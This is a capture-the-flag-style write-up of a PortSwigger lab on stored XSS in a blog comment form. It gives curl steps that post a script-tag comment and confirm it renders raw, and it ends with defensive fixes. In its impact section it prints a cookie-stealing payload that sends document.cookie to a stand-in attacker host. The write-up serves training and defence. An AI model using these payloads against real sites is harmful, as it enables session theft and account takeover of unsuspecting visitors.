---
title: "Stored XSS into HTML context with nothing encoded"
date: 2026-08-23 09:00:00 -0500
categories: [PortSwigger, Cross-site-scripting]
tags: [portswigger, cwe-79, xss, stored, persistent, html-context]
description: "The persistent cousin of reflected XSS: a blog comment box saves your input and renders it raw into the post for every later visitor. No per-victim link needed — store the payload once and it fires for everyone. The full flow: scrape the session CSRF token, post a bare <script> comment, confirm it rendered un-encoded."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Stored XSS into HTML context with nothing encoded
---

## Overview

This is the persistent version of the simplest [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) case. The blog lets visitors leave comments, and it renders each comment back into the post page with **no output encoding at all** — so a comment of `<script>alert(1)</script>` is stored and then runs in the browser of every person who later reads that post.

## The technique

Stored (or *persistent*) XSS happens when user input is saved server-side and later embedded into a response that reaches other users' browsers without being neutralized. The crucial difference from reflected XSS is delivery: a reflected payload travels in the request and must be delivered to each victim (usually via a crafted link), but a stored payload is planted once and the application serves it to everyone who views the page — no link, no per-victim interaction.

As with all XSS the bug is **context-dependent**: the payload lands directly in the post's HTML body (raw HTML context), and nothing is encoded, which is the easiest context to exploit — a bare tag just works. HTML decides "tag vs. text" by looking at angle brackets, so because the raw `<` and `>` reached the browser untouched, `<script>...</script>` was parsed as a live element rather than displayed as text.

## Solution

The comment form is guarded by a per-session anti-CSRF token, so the exploit is a two-step *scrape-then-post*.

**Step 1 — grab a session and its CSRF token.** Fetch the post with a cookie jar and read the hidden `csrf` field:

```bash
curl -sk -c cookies.txt "https://<lab-instance>.web-security-academy.net/post?postId=5" \
  | grep -oE 'name="csrf" value="[^"]+"'
```

**Step 2 — post the comment with the payload.** Send the form back with the same cookie and the script tag as the comment body:

```bash
curl -sk -b cookies.txt "https://<lab-instance>.web-security-academy.net/post/comment" \
  --data-urlencode "csrf=<token-from-step-1>" \
  --data-urlencode "postId=5" \
  --data-urlencode "comment=<script>alert(1)</script>" \
  --data-urlencode "name=tester" \
  --data-urlencode "email=tester@test.com" \
  --data-urlencode "website=https://test.com"
```

A `302` redirect means the comment was accepted.

**Step 3 — confirm it rendered raw.** Re-load the post and check the payload came back un-encoded:

```bash
curl -sk "https://<lab-instance>.web-security-academy.net/post?postId=5" \
  | grep -o '<script>alert(1)</script>'
```

The post body now contains the payload verbatim:

```html
<p><script>alert(1)</script></p>
```

Any visitor who opens that post pops the alert, and the lab flips to **Solved**.

## Why it worked

The application stored the comment and built the post's HTML by string-concatenating that comment into the page with no context-aware escaping. Output encoding has to happen at the point where data crosses into a new context (here, into HTML), and it was simply absent. Every character with special meaning to the HTML parser — `<`, `>`, `"`, `'` — passed straight through, so the attacker controls markup, not just text. Because the value is *stored*, the bad output is replayed to every reader, not just the person who submitted it.

## Real-world impact

`alert(1)` is only a proof of execution, and stored XSS is more dangerous than reflected because it is self-delivering and hits everyone — including privileged users like an admin reviewing comments. The same hole steals a session cookie when it lacks `HttpOnly`:

```html
<script>new Image().src='//attacker.example/'+document.cookie</script>
```

It also enables performing authenticated actions as each victim, defacing the page for all visitors, keylogging, or chaining to full account takeover when an administrator views the poisoned page.

## Fix / defense

- **Context-aware output encoding** — HTML-encode `< > " ' &` whenever stored user input is rendered into the page (`&lt;script&gt;`). This is the primary control, and the encoding must match the output context.
- **Use a framework that auto-escapes by default** (React, Jinja2/Twig autoescape, Rails `h()`) and avoid dangerous sinks like `innerHTML` and `document.write`.
- **Content-Security-Policy** as defense-in-depth — block inline scripts so an injected `<script>` won't run even if it lands.
- **HttpOnly + SameSite cookies** to blunt the session-theft escalation.
